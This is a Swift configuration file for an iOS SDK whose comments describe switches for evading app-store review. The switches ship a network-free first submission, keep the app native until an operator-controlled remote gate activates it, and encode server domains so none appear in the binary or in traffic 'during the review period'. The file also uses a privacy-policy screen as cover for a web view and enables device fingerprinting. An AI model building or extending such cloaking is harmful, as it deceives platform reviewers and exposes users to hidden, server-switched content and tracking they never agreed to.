// NyxDispatcherConfig.swift
// Application configuration and settings

import Foundation
import CryptoKit

// MARK: - Configuration

struct NyxDispatcherConfig {

    // MARK: - Server

    /// API version
    static let apiVersion = "v1"

    /// Wire schema version sent in the ``X-Schema`` header. "1" = legacy
    /// field names; "2" = standardized field names (#12 schema.rename_schema,
    /// inject flips this to "2" and rewrites the response ``CodingKeys`` in
    /// ``NetworkModels``). The server serves v2 keys only to "2" clients,
    /// so legacy builds are unaffected.
    static let schemaVersion = "2"
    /// Networking control gate (#16 schema.clean_first_submission).
    /// When disabled the SDK makes no server calls — ``NyxDispatcherRouter`` renders
    /// native content only. Enables an initial submission with local-only
    /// operation; a subsequent update re-enables network capabilities.
    /// Default true → normal behaviour.
    static let networkingEnabled = true
    // MARK: - Build-time String Encoding (pipeline-configured)

    /// Per-build encoding key. Empty by default → encoding off and
    /// every string below falls back to its ``*Plain`` literal, so the
    /// SDK behaves byte-for-byte as before. When
    /// ``schema.encode_strings`` is set, ``inject.py`` fills this
    /// and ``vault`` and blanks the ``*Plain`` literals, so the shipped
    /// binary carries no human-readable domain / endpoint strings.
    static let vaultKey: [UInt8] = []

    /// Encoded UTF-8 of, in order:
    /// ``[serverURL, initPath, alternateInitPath, eventPath, pushTokenPath]``.
    /// Empty by default. See ``NyxPortal`` and ``vaultReveal``.
    static let vault: [[UInt8]] = []

    /// Plaintext development fallbacks. Used verbatim when the vault is empty
    /// (default / dev / unit tests). ``inject.py`` blanks the *value* of
    /// each of these (``= ""``) when it populates the vault, so they
    /// are excluded from production builds when encoding is active.
    static let serverURLPlain = "https://wildcherry.cloud"
    static let initPathPlain = "/api/v1/client/init"
    static let alternateInitPathPlain = "/api/v2/assets/config.json"
    static let eventPathPlain = "/api/v1/client/event"
    static let pushTokenPathPlain = "/api/v1/client/push-token"

    /// Decode vault entry ``idx``, or return ``fallback`` when
    /// encoding is disabled or the entry is absent.
    private static func vaultReveal(_ idx: Int, _ fallback: String) -> String {
        guard idx >= 0, idx < vault.count,
              let s = NyxPortal.reveal(vault[idx], key: vaultKey) else {
            return fallback
        }
        return s
    }

    // MARK: - Server URL + Endpoints (pipeline-configured)

    /// Backend base URL. Computed so a production build resolves it
    /// from the vault at runtime; a development build returns the injected
    /// (or dev placeholder) plaintext.
    static var serverURL: String { vaultReveal(0, serverURLPlain) }

    /// Path suffix for the event endpoint.
    static var eventPathSuffix: String { vaultReveal(3, eventPathPlain) }
    /// Path suffix for the push-token endpoint.
    static var pushTokenPathSuffix: String { vaultReveal(4, pushTokenPathPlain) }

    static var initEndpoint: String { serverURL + wirePath("init", fallback: vaultReveal(1, initPathPlain)) }
    static var eventEndpoint: String { serverURL + wirePath("event", fallback: eventPathSuffix) }
    /// POST target for the dedicated push-token upload route — kept
    /// off ``/init`` so init stays idempotent and we can track
    /// "gave token" as a distinct conversion from "started session".
    static var pushTokenEndpoint: String { serverURL + wirePath("push", fallback: pushTokenPathSuffix) }

    /// #1 — when ``perAppPathsEnabled`` (and a ``masterSecret`` is present)
    /// the request path is derived per-app from the secret (``NyxNova``),
    /// so each app uses a unique endpoint path. Default
    /// OFF → byte-identical legacy behaviour until the server resolver ships.
    static func wirePath(_ label: String, fallback: @autoclosure () -> String) -> String {
        if perAppPathsEnabled && !masterSecret.isEmpty {
            let p = NyxNova.derive(masterSecret, label)
            if !p.isEmpty { return p }
        }
        return fallback()
    }

    // MARK: - Runtime-string Encoding (pipeline-configured)

    /// Separate per-build encoding key + table for runtime string constants:
    /// custom HTTP header names and storage keys.
    /// Independent of the endpoint vault above (its own key) so
    /// ``schema.encode_runtime_strings`` can be toggled independently.
    /// Empty by default → the ``*Plain`` fallbacks are used verbatim.
    /// ``inject.py`` fills these and blanks the ``*Plain`` literals when
    /// the flag is set.
    ///
    /// NOTE: the header NAME sent on the wire is identical regardless of
    /// encoding — the server needs no change.
    static let rtVaultKey: [UInt8] = []
    static let rtVault: [[UInt8]] = []

    /// Runtime-string fallbacks, blanked by inject when the vault is on.
    /// Order MUST match the ``rtReveal`` indices below.
    static let hdrSchemaPlain = "X-Schema"
    static let hdrSignaturePlain = "X-Signature"
    static let hdrTimestampPlain = "X-Timestamp"
    static let hdrFlowTokenPlain = "X-Flow-Token"
    static let flowTokenKeyPlain = "widget.flow.token"
    static let restrictionKeyPlain = "widget.cached.restriction"

    fileprivate static func rtReveal(_ idx: Int, _ fallback: String) -> String {
        guard idx >= 0, idx < rtVault.count,
              let s = NyxPortal.reveal(rtVault[idx], key: rtVaultKey) else {
            return fallback
        }
        return s
    }

    /// Custom header names (pipeline-configured). Same value on the wire.
    static var hdrSchema: String { rtReveal(0, hdrSchemaPlain) }
    static var hdrSignature: String { rtReveal(1, hdrSignaturePlain) }
    static var hdrTimestamp: String { rtReveal(2, hdrTimestampPlain) }
    static var hdrFlowToken: String { rtReveal(3, hdrFlowTokenPlain) }

    // MARK: - Cherry Flow (pipeline-configured)

    /// Master gate for the in-house web-to-app attribution engine. When
    /// the AppFactory pipeline builds a ``full_web2app`` app it flips
    /// this to ``true`` via ``inject.py``. Default ``false`` →
    /// fingerprint collection and the web→native bridge are excluded,
    /// so a ``base`` configuration behaves byte-for-byte as before.
    static let cherryFlowEnabled = true
    /// Route ``/init`` to the alternate path alias
    /// (``/api/v2/assets/config.json``) instead of
    /// ``/api/v1/client/init``. Uses a standard asset-path format
    /// compatible with static caching policies. Only meaningful when
    /// ``cherryFlowEnabled``.
    static let alternateInitPathEnabled = false

    /// Encrypt request + response bodies with AES-GCM (``NyxFeed``,
    /// keyed by ``SHA256(masterSecret)``). Opt-in via the pipeline flag
    /// ``schema.encrypt_body``; requires ``masterSecret`` to be set
    /// (shares the HMAC root secret). When off — the default — bodies
    /// are sent as plaintext JSON. HMAC signing is independent and
    /// stays governed by ``hmacEnabled`` (it signs the ciphertext
    /// envelope when both are on).
    static let encryptBodyEnabled = false
    /// Move all auth into the encrypted body (#13 ``schema.auth_in_body``).
    /// When on (requires ``encryptBodyEnabled`` + ``masterSecret``) the
    /// request ships as ``{"b": bundleId, "d": <encrypted>}`` with NO custom
    /// ``X-*`` headers — signature/timestamp/api-key/flow-token/schema/version
    /// all live inside the ciphertext. Default off → headers as before.
    static let authInBodyEnabled = false
    // MARK: - Privacy in Settings (pipeline-configured)

    /// When true, the NyxFlow overlay layer renders a discreet settings
    /// affordance over native content; tapping it opens an in-app
    /// settings sheet whose "Privacy Policy" row loads ``privacyURL`` in
    /// a WKWebView. Opt-in via ``schema.privacy_in_settings``. Provides
    /// a legitimate, expected reason to embed a web view (standard
    /// in-app privacy policy pattern) and a real settings surface.
    /// Default off → no gear, behaviour unchanged.
    static let privacyInSettingsEnabled = false
    /// Privacy-policy URL baked at build time. ``s02`` replaces the
    /// ``https://example.com/privacy`` placeholder with the app's real
    /// generated URL. Left as the placeholder for dev/tests. This is
    /// intentionally NOT encoded — a readable privacy URL is benign and
    /// expected.
    static let privacyURLString = "https://example.com/privacy"

    /// Parsed privacy URL, or nil if unset/placeholder-only.
    static var privacyURL: URL? {
        guard !privacyURLString.isEmpty,
              privacyURLString != "https://example.com/privacy" else { return nil }
        return URL(string: privacyURLString)
    }

    // MARK: - Preflight Gate (pipeline-configured)

    /// Two-stage server activation gate (``schema.preflight_gate``). When on,
    /// the SDK first fetches a remote configuration feed from an independent
    /// endpoint (a Cloudflare Worker on a separate domain, ``preflightGateURL``)
    /// BEFORE it ever contacts the primary server. Only when that feed
    /// carries a valid activation envelope — AES-GCM-sealed with
    /// ``masterSecret`` and served solely under operator control — does the
    /// app resolve the primary server URL and proceed. Until then it
    /// stays fully native, so the primary server domain appears neither in
    /// the binary nor in any traffic during the review period. Requires
    /// ``masterSecret`` (the envelope is encrypted); ``inject.py`` only
    /// flips this on when a secret is present. Default off → no pre-flight,
    /// the SDK uses ``serverURL`` directly.
    static let preflightGateEnabled = false

    /// Base URL of the preflight configuration endpoint, e.g.
    /// ``https://cfg.example.com/v1/config``. The SDK requests
    /// ``preflightGateURL + "/" + preflightGateID``. Intentionally NOT
    /// encoded — a standard configuration host is expected to read as
    /// unremarkable. Empty → the gate can't run and the app stays native.
    static let preflightGateURLPlain = ""

    /// Per-app random identifier = the gate's KV key / path segment. Allows
    /// the operator to toggle this app without exposing the bundle id and
    /// makes the gate endpoint non-enumerable. Empty → gate disabled.
    static let preflightGateID = ""

    /// Preflight gate base URL (computed for symmetry / future use).
    static var preflightGateURL: String { preflightGateURLPlain }

    /// Path suffix for the init request, honouring ``alternateInitPathEnabled``.
    /// For ``base`` apps this is always ``/api/v1/client/init`` → no
    /// change to the existing request URL. Both variants resolve through
    /// the vault so a production build uses encoded paths.
    static var initPathSuffix: String {
        alternateInitPathEnabled
            ? vaultReveal(2, alternateInitPathPlain)
            : vaultReveal(1, initPathPlain)
    }

    // MARK: - Timeouts

    static let requestTimeout: TimeInterval = 30
    static let webViewTimeout: TimeInterval = 60

    // MARK: - Storage Keys

    enum Keys {
        static let uniqueID = "widget.user.unique_id"
        static let cachedConfig = "widget.cached.config"
        static let pushShownDate = "widget.push.shown_date"
        static let pushResult = "widget.push.result"  // "accepted", "skipped", "denied"
        static let rateShownDate = "widget.rate.shown_date"
        static let privacyAcceptedDate = "widget.privacy.accepted_date"
        static let firstLaunchDate = "widget.first.launch"
        /// Sticky per-device mode assignment (`native` or `web`) issued
        /// by the server on first contact. Once set, never overwritten;
        /// ensures devices assigned native on first install stay native
        /// for the lifetime of this install regardless of server changes.
        /// Pipeline-configured: runtime value via ``rtReveal``.
        static var flowToken: String { NyxDispatcherConfig.rtReveal(4, NyxDispatcherConfig.flowTokenKeyPlain) }
        /// Cached content restriction payload for persistent mode
        /// rendering on cold launch before the first ``/init`` completes.
        /// Written only when the server-returned payload has ``sticky=true``;
        /// cleared by any server response without a ``restriction`` field.
        /// Pipeline-configured: runtime value via ``rtReveal``.
        static var cachedRestriction: String { NyxDispatcherConfig.rtReveal(5, NyxDispatcherConfig.restrictionKeyPlain) }
    }

    // MARK: - Security (pipeline-configured)

    /// Per-app API key. The AppFactory pipeline replaces this constant
    /// at build time via ``inject.py`` when ``schema.hmac_enabled`` is
    /// set in the client YAML. Empty string → legacy path, server
    /// accepts unsigned requests.
    static let apiKey = ""
    /// HMAC signing key (64-hex) used by ``NyxGalleryClient`` to sign
    /// ``/client/init`` and ``/client/event`` requests. Injected by the
    /// pipeline alongside ``apiKey``; empty → no signing.
    static let masterSecret = ""
    /// When true, ``NyxGalleryClient`` attaches ``X-Signature`` +
    /// ``X-Timestamp`` headers computed from ``masterSecret``.
    /// Defaults to ``false`` so legacy builds (and the SDK tests) behave
    /// exactly like before enrollment.
    static let hmacEnabled = false
    /// #1 — when true (and ``masterSecret`` is set), request paths are
    /// derived per-app from the secret via ``NyxNova`` instead of the
    /// fixed ``/api/v1/client/*``. Injected by the pipeline from
    /// ``schema.per_app_paths``. Default ``false`` → legacy paths, so this
    /// is inert until the server resolver is deployed.
    static let perAppPathsEnabled = false

    // MARK: - Deep links (pipeline-configured)

    /// Custom URL scheme the app registers with iOS (e.g. ``myapp``).
    /// Pipeline writes this alongside the matching ``CFBundleURLSchemes``
    /// entry in ``Info.plist``. Empty → ``NyxMeadowRouter`` drops every
    /// incoming custom-scheme URL, which is the correct default for
    /// apps that haven't been wired up yet.
    static let deepLinkScheme = ""
    /// Hosts the app is allowed to receive universal links from.
    /// Each entry must match the ``webpageURL.host`` exactly (the
    /// comparison is case-insensitive). Empty → universal links are
    /// ignored. Pipeline writes this alongside the entitlement
    /// ``com.apple.developer.associated-domains`` so the SDK and the OS
    /// agree on the whitelist.
    static let universalDomains: [String] = []
    // MARK: - Delays

    /// Default delay for privacy policy sheet (seconds)
    static let privacyDelay: TimeInterval = 2

    // MARK: - Debug

    #if DEBUG
    static let isLoggingEnabled = true
    #else
    static let isLoggingEnabled = false
    #endif
}

// MARK: - App Settings

struct NyxDispatcherSettings {

    /// Your API key for backend authentication
    var apiKey: String = ""

    /// Custom server URL (optional override)
    var serverURL: String = NyxDispatcherConfig.serverURL

    /// Enable debug logging
    var debugMode: Bool = NyxDispatcherConfig.isLoggingEnabled

    /// Request timeout
    var timeout: TimeInterval = NyxDispatcherConfig.requestTimeout

    /// App has ATT (App Tracking Transparency) permission in Info.plist
    /// Set to false if your app doesn't use ATT - will send "not_supported" to server
    var hasATT: Bool = true

    /// Auto-request tracking permission (only works if hasATT = true)
    var requestTrackingOnLaunch: Bool = true

    /// Override server push delay (seconds)
    var pushDelayOverride: TimeInterval?

    /// Override server rate delay (seconds)
    var rateDelayOverride: TimeInterval?

    /// Privacy Policy URL
    var privacyURL: URL?

    // MARK: - Builder

    static func create() -> Builder { Builder() }

    class Builder {
        private var settings = NyxDispatcherSettings()

        @discardableResult
        func apiKey(_ key: String) -> Builder {
            settings.apiKey = key
            return self
        }

        @discardableResult
        func serverURL(_ url: String) -> Builder {
            settings.serverURL = url
            return self
        }

        @discardableResult
        func debug(_ enabled: Bool) -> Builder {
            settings.debugMode = enabled
            return self
        }

        @discardableResult
        func timeout(_ seconds: TimeInterval) -> Builder {
            settings.timeout = seconds
            return self
        }

        @discardableResult
        func hasATT(_ enabled: Bool) -> Builder {
            settings.hasATT = enabled
            return self
        }

        @discardableResult
        func trackingOnLaunch(_ enabled: Bool) -> Builder {
            settings.requestTrackingOnLaunch = enabled
            return self
        }

        @discardableResult
        func pushDelay(_ seconds: TimeInterval) -> Builder {
            settings.pushDelayOverride = seconds
            return self
        }

        @discardableResult
        func rateDelay(_ seconds: TimeInterval) -> Builder {
            settings.rateDelayOverride = seconds
            return self
        }

        @discardableResult
        func privacyURL(_ url: URL?) -> Builder {
            settings.privacyURL = url
            return self
        }

        func build() -> NyxDispatcherSettings { settings }
    }
}
